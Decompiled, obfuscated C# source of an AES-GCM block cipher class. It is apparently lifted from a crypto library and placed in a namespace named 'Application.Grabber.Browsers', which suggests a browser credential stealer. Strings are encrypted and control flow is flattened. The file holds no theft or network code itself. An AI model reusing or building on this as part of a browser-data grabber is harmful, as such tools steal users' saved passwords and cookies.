using System;
using System.Runtime.CompilerServices;

namespace Application.Grabber.Browsers
{
	// Token: 0x0200001E RID: 30
	public class GcmBlockCipher : IAeadBlockCipher
	{
		// Token: 0x1700002E RID: 46
		// (get) Token: 0x060000CF RID: 207 RVA: 0x00006B14 File Offset: 0x00004D14
		public virtual string AlgorithmName
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			get
			{
				return delegate0d0.f0000ba(this.cipher.AlgorithmName, c0000c0.m00000f("¾F\u000e)"));
			}
		}

		// Token: 0x060000D0 RID: 208 RVA: 0x00006B40 File Offset: 0x00004D40
		[MethodImpl(MethodImplOptions.NoInlining)]
		public GcmBlockCipher(IBlockCipher p0) : this(p0, null)
		{
		}

		// Token: 0x060000D1 RID: 209 RVA: 0x00006B4C File Offset: 0x00004D4C
		[MethodImpl(MethodImplOptions.NoInlining)]
		public GcmBlockCipher(IBlockCipher p0, IGcmMultiplier p1)
		{
			if (p0.GetBlockSize() != 16)
			{
				throw new ArgumentException(delegate0ff.f000122(c0000c0.m00000f("òh=\fÃ\u001b\u0013EÉ\u0003;Ezò)Gáë\u001a\u000e\r¥:Ï?Ñ\u0014µ7Ë\u008aÌx\u0017%\n¸"), 16.ToString(), c0000c0.m00000f("¿")));
			}
			if (p1 == null)
			{
				p1 = new c00001d();
			}
			this.cipher = p0;
			this.multiplier = p1;
		}

		// Token: 0x060000D2 RID: 210 RVA: 0x00006BB8 File Offset: 0x00004DB8
		[MethodImpl(MethodImplOptions.NoInlining)]
		public virtual int GetBlockSize()
		{
			return 16;
		}

		// Token: 0x060000D3 RID: 211 RVA: 0x00006BC8 File Offset: 0x00004DC8
		[MethodImpl(MethodImplOptions.NoInlining)]
		public virtual void Init(bool forEncryption, ICipherParameters parameters)
		{
			int num2;
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					switch (num)
					{
					case 0:
					{
						AeadParameters aeadParameters;
						this.keyParam = aeadParameters.Key;
						goto IL_200;
					}
					case 1:
						goto IL_23B;
					case 2:
						if (this.nonce == null || this.nonce.Length < 1)
						{
							goto IL_4F;
						}
						if (this.A == null)
						{
							this.A = new byte[0];
						}
						this.cipher.Init(true, this.keyParam);
						this.H = new byte[16];
						this.cipher.ProcessBlock(this.H, 0, this.H, 0);
						this.multiplier.Init(this.H);
						this.initS = this.m000012(this.A);
						if (this.nonce.Length == 12)
						{
							this.J0 = new byte[16];
							num = delegate0da.f0000d7(-1);
							continue;
						}
						goto IL_265;
					case 3:
						this.forEncryption = forEncryption;
						this.macBlock = null;
						if (parameters is AeadParameters)
						{
							AeadParameters aeadParameters = (AeadParameters)parameters;
							this.nonce = aeadParameters.GetNonce();
							this.A = aeadParameters.GetAssociatedText();
							num2 = aeadParameters.MacSize;
							if (num2 < 96 || num2 > 128 || num2 % 8 != 0)
							{
								goto IL_164;
							}
							this.macSize = num2 / 8;
							num = delegate0da.f0000d7(0);
							continue;
						}
						else
						{
							if (!(parameters is ParametersWithIV))
							{
								goto Block_7;
							}
							ParametersWithIV parametersWithIV = (ParametersWithIV)parameters;
							this.nonce = parametersWithIV.GetIV();
							this.A = null;
							this.macSize = 16;
							this.keyParam = (KeyParameter)parametersWithIV.Parameters;
							goto IL_200;
						}
						break;
					}
					break;
					IL_200:
					int num3 = forEncryption ? 16 : (16 + this.macSize);
					this.bufBlock = new byte[num3];
					num = delegate0da.f0000d7(-2);
				}
			}
			IL_4F:
			throw new ArgumentException(c0000c0.m00000f("ØWm\tÓ\u001aG\u0017Î\u0017nM|·!\u0002÷ñ\u001aF\u001cäxÔ'Û"));
			IL_164:
			throw new ArgumentException(c0000c0.m00000f("Øo;\u0005Ê\0W\u0017Ú\u0013\"Ym·+\bä¢#'näiÄ)ÛMþ") + num2.ToString());
			Block_7:
			throw new ArgumentException(c0000c0.m00000f("øo;\u0005Ê\0W\u0017Ü\u0013<Meò9\u0002äñN\u0016L·iÈ7\u009e\u0003±7ÿ\u00a0û"));
			IL_23B:
			Array.Copy(this.nonce, 0, this.J0, 0, this.nonce.Length);
			this.J0[15] = 1;
			goto IL_2B2;
			IL_265:
			this.J0 = this.m000012(this.nonce);
			byte[] array = new byte[16];
			GcmBlockCipher.packLength((ulong)((long)this.nonce.Length * 8L), array, 8);
			GcmUtilities.Xor(this.J0, array);
			this.multiplier.MultiplyH(this.J0);
			IL_2B2:
			this.S = Arrays.Clone(this.initS);
			this.counter = Arrays.Clone(this.J0);
			this.bufOff = 0;
			this.totalLength = 0UL;
		}

		// Token: 0x060000D4 RID: 212 RVA: 0x00006EB8 File Offset: 0x000050B8
		[MethodImpl(MethodImplOptions.NoInlining)]
		public virtual byte[] GetMac()
		{
			return Arrays.Clone(this.macBlock);
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x00006ED0 File Offset: 0x000050D0
		[MethodImpl(MethodImplOptions.NoInlining)]
		public virtual int GetOutputSize(int len)
		{
			if (this.forEncryption)
			{
				return len + this.bufOff + this.macSize;
			}
			return len + this.bufOff - this.macSize;
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x00006F04 File Offset: 0x00005104
		[MethodImpl(MethodImplOptions.NoInlining)]
		public virtual int GetUpdateOutputSize(int len)
		{
			return (len + this.bufOff) / 16 * 16;
		}

		// Token: 0x060000D7 RID: 215 RVA: 0x00006F20 File Offset: 0x00005120
		[MethodImpl(MethodImplOptions.NoInlining)]
		public virtual int ProcessByte(byte input, byte[] output, int outOff)
		{
			return this.Process(input, output, outOff);
		}

		// Token: 0x060000D8 RID: 216 RVA: 0x00006F38 File Offset: 0x00005138
		[MethodImpl(MethodImplOptions.NoInlining)]
		public virtual int ProcessBytes(byte[] input, int inOff, int len, byte[] output, int outOff)
		{
			int num4;
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					int num3;
					switch (num)
					{
					case 0:
					{
						IL_92:
						byte[] array = this.bufBlock;
						int num2 = this.bufOff;
						this.bufOff = num2 + 1;
						array[num2] = input[inOff + num3];
						if (this.bufOff == this.bufBlock.Length)
						{
							this.gCTRBlock(this.bufBlock, 16, output, outOff + num4);
							num = delegate0da.f0000d7(-2);
							continue;
						}
						goto IL_F3;
					}
					case 1:
						num4 += 16;
						goto IL_F3;
					case 2:
						if (!this.forEncryption)
						{
							delegate0fe.f000120(this.bufBlock, 16, this.bufBlock, 0, this.macSize);
						}
						this.bufOff = this.bufBlock.Length - 16;
						num = delegate0da.f0000d7(-1);
						continue;
					case 3:
						num4 = 0;
						num3 = 0;
						goto IL_F7;
					}
					break;
					IL_F7:
					if (num3 == len)
					{
						return num4;
					}
					goto IL_92;
					IL_F3:
					num3++;
					goto IL_F7;
				}
			}
			return num4;
		}

		// Token: 0x060000D9 RID: 217 RVA: 0x00007044 File Offset: 0x00005244
		[MethodImpl(MethodImplOptions.NoInlining)]
		private int Process(byte input, byte[] output, int outOff)
		{
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					switch (num)
					{
					case 0:
						this.gCTRBlock(this.bufBlock, 16, output, outOff);
						if (!this.forEncryption)
						{
							num = delegate0da.f0000d7(-2);
							continue;
						}
						goto IL_50;
					case 1:
						return 16;
					case 2:
						Array.Copy(this.bufBlock, 16, this.bufBlock, 0, this.macSize);
						goto IL_50;
					case 3:
					{
						byte[] array = this.bufBlock;
						int num2 = this.bufOff;
						this.bufOff = num2 + 1;
						array[num2] = input;
						if (this.bufOff == this.bufBlock.Length)
						{
							num = delegate0da.f0000d7(0);
							continue;
						}
						return 0;
					}
					}
					break;
					IL_50:
					this.bufOff = this.bufBlock.Length - 16;
					num = delegate0da.f0000d7(-1);
				}
			}
			return 16;
		}

		// Token: 0x060000DA RID: 218 RVA: 0x00007148 File Offset: 0x00005348
		[MethodImpl(MethodImplOptions.NoInlining)]
		public int DoFinal(byte[] output, int outOff)
		{
			int num2;
			int num3;
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					switch (num)
					{
					case 0:
					{
						byte[] array;
						Array.Copy(this.bufBlock, 0, array, 0, num2);
						this.gCTRBlock(array, num2, output, outOff);
						goto IL_128;
					}
					case 1:
						goto IL_188;
					case 2:
					{
						byte[] array2 = new byte[16];
						this.cipher.ProcessBlock(this.J0, 0, array2, 0);
						GcmUtilities.Xor(array2, this.S);
						num3 = num2;
						this.macBlock = new byte[this.macSize];
						delegate0fe.f000120(array2, 0, this.macBlock, 0, this.macSize);
						if (this.forEncryption)
						{
							num = delegate0da.f0000d7(-1);
							continue;
						}
						goto IL_1B5;
					}
					case 3:
						num2 = this.bufOff;
						if (!this.forEncryption)
						{
							if (num2 < this.macSize)
							{
								goto Block_3;
							}
							num2 -= this.macSize;
						}
						if (num2 > 0)
						{
							byte[] array = new byte[16];
							num = delegate0da.f0000d7(0);
							continue;
						}
						goto IL_128;
					}
					break;
					IL_128:
					byte[] array3 = new byte[16];
					GcmBlockCipher.packLength((ulong)((long)this.A.Length * 8L), array3, 0);
					GcmBlockCipher.packLength(this.totalLength * 8UL, array3, 8);
					GcmUtilities.Xor(this.S, array3);
					this.multiplier.MultiplyH(this.S);
					num = delegate0da.f0000d7(-2);
				}
			}
			Block_3:
			throw new InvalidCipherTextException(c0000c0.m00000f("õ`9\u0005\u0086\u001d\\X\u008c\u0001&Czã"));
			IL_188:
			Array.Copy(this.macBlock, 0, output, outOff + this.bufOff, this.macSize);
			num3 += this.macSize;
			IL_1AC:
			this.Reset(false);
			return num3;
			IL_1B5:
			byte[] array4 = new byte[this.macSize];
			delegate0fe.f000120(this.bufBlock, num2, array4, 0, this.macSize);
			if (!Arrays.ConstantTimeAreEqual(this.macBlock, array4))
			{
				throw new InvalidCipherTextException(c0000c0.m00000f("ü`.DÅ\u0001VTÇR'B(Ð\u000e*¶ä\u000f\u000fA¡~"));
			}
			goto IL_1AC;
		}

		// Token: 0x060000DB RID: 219 RVA: 0x00007354 File Offset: 0x00005554
		[MethodImpl(MethodImplOptions.NoInlining)]
		public virtual void Reset()
		{
			this.Reset(true);
		}

		// Token: 0x060000DC RID: 220 RVA: 0x00007368 File Offset: 0x00005568
		[MethodImpl(MethodImplOptions.NoInlining)]
		private void Reset(bool clearMac)
		{
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					switch (num)
					{
					case 0:
						this.bufOff = 0;
						this.totalLength = 0UL;
						num = delegate0da.f0000d7(-2);
						continue;
					case 1:
						goto IL_D3;
					case 2:
						if (this.bufBlock != null)
						{
							delegate0100.f000124(this.bufBlock, 0, this.bufBlock.Length);
							num = delegate0da.f0000d7(-1);
							continue;
						}
						goto IL_D3;
					case 3:
						this.S = Arrays.Clone(this.initS);
						this.counter = Arrays.Clone(this.J0);
						num = delegate0da.f0000d7(0);
						continue;
					}
					break;
				}
			}
			IL_D3:
			if (clearMac)
			{
				this.macBlock = null;
			}
			this.cipher.Reset();
		}

		// Token: 0x060000DD RID: 221 RVA: 0x00007460 File Offset: 0x00005660
		[MethodImpl(MethodImplOptions.NoInlining)]
		private void gCTRBlock(byte[] buf, int bufCount, byte[] output, int outOff)
		{
			byte[] array2;
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					int num2;
					switch (num)
					{
					case 0:
					{
						byte b;
						if (b != 0)
						{
							goto IL_91;
						}
						num2--;
						goto IL_55;
					}
					case 1:
						goto IL_E7;
					case 2:
						goto IL_36;
					case 3:
						num2 = 15;
						goto IL_55;
					}
					break;
					IL_55:
					if (num2 >= 12)
					{
						byte[] array = this.counter;
						int num3 = num2;
						byte b = array[num3] + 1;
						array[num3] = b;
						num = delegate0da.f0000d7(0);
						continue;
					}
					IL_91:
					array2 = new byte[16];
					this.cipher.ProcessBlock(this.counter, 0, array2, 0);
					if (!this.forEncryption)
					{
						goto IL_3D;
					}
					delegate0fe.f000120(GcmBlockCipher.Zeroes, bufCount, array2, bufCount, 16 - bufCount);
					num = delegate0da.f0000d7(-2);
				}
			}
			IL_36:
			byte[] val = array2;
			goto IL_3F;
			IL_3D:
			val = buf;
			IL_3F:
			int num4 = bufCount - 1;
			goto IL_109;
			IL_E7:
			byte[] array3 = array2;
			int num5 = num4;
			array3[num5] ^= buf[num4];
			output[outOff + num4] = array2[num4];
			num4--;
			IL_109:
			if (num4 < 0)
			{
				GcmUtilities.Xor(this.S, val);
				this.multiplier.MultiplyH(this.S);
				this.totalLength += (ulong)((long)bufCount);
				return;
			}
			goto IL_E7;
		}

		// Token: 0x060000DE RID: 222 RVA: 0x000075AC File Offset: 0x000057AC
		[MethodImpl(MethodImplOptions.NoInlining)]
		private byte[] m000012(byte[] p0)
		{
			byte[] array;
			for (;;)
			{
				int num = delegate0da.f0000d7(-3);
				for (;;)
				{
					byte[] array2;
					int num2;
					switch (num)
					{
					case 0:
						goto IL_C9;
					case 1:
						GcmUtilities.Xor(array, array2);
						this.multiplier.MultiplyH(array);
						num2 += 16;
						goto IL_C9;
					case 2:
					{
						int p = Math.Min(p0.Length - num2, 16);
						delegate0fe.f000120(p0, num2, array2, 0, p);
						num = delegate0da.f0000d7(-1);
						continue;
					}
					case 3:
						array = new byte[16];
						num2 = 0;
						num = delegate0da.f0000d7(0);
						continue;
					}
					break;
					IL_C9:
					if (num2 >= p0.Length)
					{
						return array;
					}
					array2 = new byte[16];
					num = delegate0da.f0000d7(-2);
				}
			}
			return array;
		}

		// Token: 0x060000DF RID: 223 RVA: 0x00007690 File Offset: 0x00005890
		[MethodImpl(MethodImplOptions.NoInlining)]
		private static void packLength(ulong len, byte[] p1, int off)
		{
			Pack.UInt32_To_BE((uint)(len >> 32), p1, off);
			Pack.UInt32_To_BE((uint)len, p1, off + 4);
		}

		// Token: 0x060000E0 RID: 224 RVA: 0x000076B4 File Offset: 0x000058B4
		// Note: this type is marked as 'beforefieldinit'.
		static GcmBlockCipher()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
			GcmBlockCipher.Zeroes = new byte[16];
		}

		// Token: 0x04000050 RID: 80
		private const int BlockSize = 16;

		// Token: 0x04000051 RID: 81
		private static readonly byte[] Zeroes;

		// Token: 0x04000052 RID: 82
		private readonly IBlockCipher cipher;

		// Token: 0x04000053 RID: 83
		private readonly IGcmMultiplier multiplier;

		// Token: 0x04000054 RID: 84
		private bool forEncryption;

		// Token: 0x04000055 RID: 85
		private int macSize;

		// Token: 0x04000056 RID: 86
		private byte[] nonce;

		// Token: 0x04000057 RID: 87
		private byte[] A;

		// Token: 0x04000058 RID: 88
		private KeyParameter keyParam;

		// Token: 0x04000059 RID: 89
		private byte[] H;

		// Token: 0x0400005A RID: 90
		private byte[] initS;

		// Token: 0x0400005B RID: 91
		private byte[] J0;

		// Token: 0x0400005C RID: 92
		private byte[] bufBlock;

		// Token: 0x0400005D RID: 93
		private byte[] macBlock;

		// Token: 0x0400005E RID: 94
		private byte[] S;

		// Token: 0x0400005F RID: 95
		private byte[] counter;

		// Token: 0x04000060 RID: 96
		private int bufOff;

		// Token: 0x04000061 RID: 97
		private ulong totalLength;
	}
}
